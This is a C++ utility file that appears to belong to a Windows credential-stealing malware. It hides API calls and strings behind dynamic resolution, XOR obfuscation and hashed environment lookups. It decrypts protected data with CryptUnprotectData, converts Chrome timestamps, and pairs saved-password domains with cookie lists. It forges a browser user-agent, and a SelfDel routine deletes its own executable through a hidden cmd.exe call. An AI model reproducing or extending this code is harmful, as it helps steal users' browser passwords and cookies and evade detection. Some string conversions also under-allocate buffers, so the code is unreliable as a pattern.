#include "Common.h"

BOOL Utils::IsFileExist(string path)
{
	return API(KERNEL32, GetFileAttributesA)(path.c_str()) != INVALID_FILE_ATTRIBUTES;
}

string Utils::GetCurrentPath()
{
	char result[MAX_PATH];
	return string(result, API(KERNEL32, GetModuleFileNameA)(NULL, result, MAX_PATH));
}

wchar_t* Utils::ToUnicode(const char* ascii)
{
	size_t size = API(KERNEL32, lstrlenA)(ascii);
	wchar_t* unicode = new wchar_t[size];
	API(KERNEL32, MultiByteToWideChar)(CP_UTF8, 0, ascii, -1, unicode, size + 1);
	return unicode;
}

wchar_t* Utils::ToUnicode(const char* ascii, size_t size)
{
	wchar_t* unicode = new wchar_t[size];
	API(KERNEL32, MultiByteToWideChar)(CP_UTF8, 0, ascii, -1, unicode, size + 1);
	return unicode;
}

char* Utils::ToASCII(const wchar_t* unicode)
{
	size_t size = API(KERNEL32, lstrlenW)(unicode);
	char* ascii = new char[size];
	API(KERNEL32, WideCharToMultiByte)(CP_UTF8, 0, unicode, -1, ascii, size + 1, NULL, NULL);
	return ascii;
}

void Utils::ReadAllText(string file, string& text)
{
	text = string();
	HANDLE hFile = API(KERNEL32, CreateFileA)(file.c_str(), XorInt(GENERIC_READ), XorInt(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), 0, XorInt(OPEN_EXISTING), XorInt(FILE_ATTRIBUTE_NORMAL), 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwSize = API(KERNEL32, GetFileSize)(hFile, 0);
		if (dwSize != 0)
		{
			char* buff = new char[dwSize];
			if (buff != nullptr)
			{
				DWORD dwBytes;
				API(KERNEL32, ReadFile)(hFile, buff, dwSize, &dwBytes, 0);
				text = string(buff, dwBytes);
			}
			delete[] buff;
		}

		API(KERNEL32, CloseHandle)(hFile);
	}
}

void Utils::ReadFileBytes(vector<byte>& bytes, string filePath)
{
	HANDLE hFile = API(KERNEL32, CreateFileA)(filePath.c_str(), XorInt(GENERIC_READ), XorInt(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), 0, XorInt(OPEN_EXISTING), XorInt(FILE_ATTRIBUTE_NORMAL), 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwSize = API(KERNEL32, GetFileSize)(hFile, 0);
		char* buff = new char[dwSize];
		DWORD dwBytes;
		API(KERNEL32, ReadFile)(hFile, buff, dwSize, &dwBytes, 0);
		API(KERNEL32, CloseHandle)(hFile);
		for (DWORD i = 0; i < dwSize; ++i)
			bytes.push_back(buff[i]);
		delete[] buff;
	}
}

void Utils::WriteFileData(string filePath, string fileData)
{
	if (IsFileExist(filePath)) API(KERNEL32, DeleteFileA)(filePath.c_str());

	HANDLE hFile = API(KERNEL32, CreateFileA)(filePath.c_str(), XorInt(GENERIC_WRITE), XorInt(FILE_SHARE_WRITE), 0, XorInt(CREATE_ALWAYS), XorInt(FILE_ATTRIBUTE_NORMAL), 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD bytesWriten;
		API(KERNEL32, WriteFile)(hFile, fileData.c_str(), fileData.size(), &bytesWriten, nullptr);
		API(KERNEL32, CloseHandle)(hFile);
	}
}

string Utils::DecryptStr(string bytes)
{
	if (bytes.empty())
		return string();

	DATA_BLOB in, out;

	in.pbData = (BYTE*)bytes.c_str();
	in.cbData = bytes.size() + 1;

	if (API(CRYPT32, CryptUnprotectData)(&in, NULL, 0, 0, 0, 0, &out))
	{
		return string((char*)out.pbData, out.cbData);
	}

	return string();
}

void Utils::GetStringRegKeyW(HKEY hkey, string strValueName, string& output, string def_value)
{
	output = string();
	char szBuffer[512];
	DWORD dwBufferSize = sizeof(szBuffer);
	if (API(ADVAPI32, RegQueryValueExA)(hkey, strValueName.c_str(), 0, NULL, (LPBYTE)szBuffer, &dwBufferSize) == ERROR_SUCCESS)
		output = szBuffer;
	else
		output = def_value;
	return;
}

void Utils::GetStringRegKeyBytes(HKEY hKey, string strValueName, vector<byte>& output, const vector<byte>& def_value)
{
	output = def_value;
	char szBuffer[512];
	DWORD dwBufferSize = sizeof(szBuffer);
	if (API(ADVAPI32, RegQueryValueExA)(hKey, strValueName.c_str(), 0, NULL, (LPBYTE)szBuffer, &dwBufferSize) == ERROR_SUCCESS)
	{
		for (size_t i = 0; i < dwBufferSize; ++i)
			output.push_back(szBuffer[i]);
	}
}

vector<string> Utils::splitBy(string str, char delim, bool leaveEmpty)
{
	if (str.empty()) return vector<string>();
	
	vector<string> output;

	string temp;
	for (char ch : str)
	{
		if (ch != delim)
			temp += ch;
		else
		{
			if (leaveEmpty || !temp.empty())
			{
				output.push_back(temp);
				temp.clear();
			}
		}
	}

	if (leaveEmpty || !temp.empty())
		output.push_back(temp);

	return output;
}

string Utils::xml_get(string text, string attribute)
{
	string res = text;
	res = res.substr(res.find(attribute));
	res = res.substr(0, res.find(XorStr("</setting>")));
	res = res.substr(res.find(XorStr("<value>")));
	res = res.substr(7);
	res = res.substr(0, res.find(XorStr("</value>")));
	return res;
}

bool isRandInit = false;
int Utils::random_number(int min, int max)
{
	if (!isRandInit)
	{
		srand(time(0));
		isRandInit = true;
	}
	return min + rand() % max;
}

string Utils::random_string(const size_t size)
{
	string alphabet = XorStr("aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ0123456789");
	string res;
	for (size_t i = 0; i < size; ++i)
	{
		res += alphabet[random_number(0, sizeof(alphabet) - 1)];
	}

	return res;
}

bool Utils::contains_record(const vector<string>& vec, string entry)
{
	string query = entry;
	for (char& ch : query)
	{
		if (ch >= 'A' && ch <= 'Z')
			ch += XorInt(32);
	}

	for (size_t i = 0; i < vec.size(); ++i)
	{
		if (vec[i].find(query) != string::npos)
			return true;
	}

	return false;
}

string Utils::replaceEnvVar(string str, bool* extended)
{
	string res;
	for (size_t i = 0; i < str.size(); ++i)
	{
		if (str[i] == '%')
		{
			string temp;
			for (; str[++i] != '%';)
			{
				temp += str[i];

			}

			if (extended && !(*extended) && temp == XorStr("ANYDRIVE")) *extended = true;
			else
			{
				res += GetEnvVar(crc32_run(temp.c_str()));
				if (res.empty()) return string();
			}
		}
		else
			res += str[i];
	}

	return res;
}

bool Utils::isNumeric(string str)
{
	for (size_t i = 0; i < str.size(); ++i)
	{
		if (str[i] < '0' || str[i] > '9')
			return false;
	}
	return true;
}

string Utils::trimStr(string str, char symbol)
{
	string res;
	for (size_t i = 0; i < str.size(); ++i)
		if (str[i] != symbol)
			res += str[i];
	return res;
}

unsigned long long Utils::str2ull(string str)
{
	if (str.empty() || !isNumeric(str))
		return 0;
	unsigned long long res = 0;
	res += str[0] - '0';
	for (size_t i = 1; i < str.size(); ++i)
	{
		res *= XorInt(10);
		res += str[i] - '0';
	}
	return res;
}

unsigned long long Utils::ToUnixTimeStamp(unsigned long long chromeTimeStamp)
{
	return ((unsigned long long)(chromeTimeStamp / 1000000ULL)) - 11644473600ULL;
}

string Utils::BuildDomains(vector<string> pass_domains, vector<string> cookie_list)
{
	if (pass_domains.empty())
	{
		return XorStr("empty");
	}

	string domains;
	for (int i = 0; i < pass_domains.size(); i++)
	{
		domains += pass_domains[i]; 
		if (contains_record(cookie_list, pass_domains[i]) || contains_record(cookie_list, '.'+pass_domains[i]))
		{
			domains += XorStr("+");
		}
		domains += XorStr(",");
	}
	return domains;
}

string Utils::GetEnvVar(UINT nameHash)
{
	PEB* pPEB = (PEB*)__readfsdword(0x30);
	wchar_t* pwszEnvironment = (wchar_t*)pPEB->ProcessParameters->Environment;
	while (*pwszEnvironment)
	{
		std::wstring var(pwszEnvironment);
		size_t i = var.find(L'=');
		if (i == std::wstring::npos)
		{
			pwszEnvironment += API(KERNEL32, lstrlenW)(pwszEnvironment) + 1;
			continue;
		}

		std::wstring varName = var.substr(0, i);
		if (varName.empty())
		{
			pwszEnvironment += API(KERNEL32, lstrlenW)(pwszEnvironment) + 1;
			continue;
		}

		if (crc32_run(varName.c_str()) == nameHash) return string(ToASCII(var.substr(i + 1).c_str()));

		pwszEnvironment += API(KERNEL32, lstrlenW)(pwszEnvironment) + 1;
	}
	return string();
}

string Utils::GenUseragent()
{
	SysInfo sysinfo;
	OsVer os = sysinfo.GetOsVer();
	string ua = XorStr("Mozilla/5.0 (Windows NT ") + 
		std::to_string(os.dwMajor) + '.' + 
		std::to_string(os.dwMinor) + ';' + 
		(os.isX64 ? XorStr(" WOW64)") : XorStr(")")) + 
		XorStr(" AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 83.0.") + 
		std::to_string(API(KERNEL32, GetTickCount)()).substr(XorInt(4)) + XorStr(".121 Safari/537.36");

	return ua;
}

void Utils::SelfDel()
{
	DEBUG("Self deleting...")
	string cmdPath = Utils::GetEnvVar(CRC32_STR("ComSpec"));
	string currPath = Utils::GetCurrentPath();
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);

	PROCESS_INFORMATION pi = { 0 };
	if (API(KERNEL32, CreateProcessA)(cmdPath.c_str(), (LPSTR)(XorStr("/c timeout /t 3  & del /f /q ") + currPath).c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
		API(KERNEL32, ExitProcess)(0);
	}
}

bool Utils::DelDirectory(string path)
{
	WIN32_FIND_DATA data;
	HANDLE hFile = API(KERNEL32, FindFirstFileA)((path + XorStr("\\*")).c_str(), &data);
	if (hFile == INVALID_HANDLE_VALUE) return false;

	do
	{
		const char* fileName = data.cFileName;
		if (fileName[0] == '.' || fileName[1] == '.') continue;

		if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) DelDirectory(path + '\\' + fileName);
		else API(KERNEL32, DeleteFileA)(fileName);

	} while (API(KERNEL32, FindNextFileA)(hFile, &data));
	API(KERNEL32, FindClose)(hFile);

	return API(KERNEL32, RemoveDirectoryA)(path.c_str());
}

char Utils::ToLower(char c)
{
	if (c >= L'A' && c <= L'Z')
		return (c - (L'A' - L'a'));
	return(c);
}

char Utils::ToUpper(char c)
{
	if (c >= L'a' && c <= L'z')
		return (c - (L'a' - L'A'));
	return(c);
}

string Utils::ToLower(string str)
{
	for (size_t i = 0; i < str.size(); i++) str[i] = ToLower(str[i]);
	return str;
}

string Utils::ToUpper(string str)
{
	for (size_t i = 0; i < str.size(); i++) str[i] = ToUpper(str[i]);
	return str;
}